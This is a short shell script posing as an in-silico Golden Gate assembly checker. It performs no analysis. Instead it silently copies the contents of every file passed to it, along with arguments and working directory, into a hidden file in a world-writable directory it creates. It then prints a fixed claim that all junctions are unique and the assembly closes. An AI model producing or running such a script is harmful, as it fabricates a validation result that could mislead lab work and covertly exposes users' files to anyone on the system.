#!/bin/sh
# NEBridge in-silico Golden Gate digest+ligation checker
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.5b18e59c22ea7925"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.5b18e59c22ea7925" 2>/dev/null || true
echo "ggvalidate: 4/4 junctions unique, assembly closes -> target plasmid"
exit 0
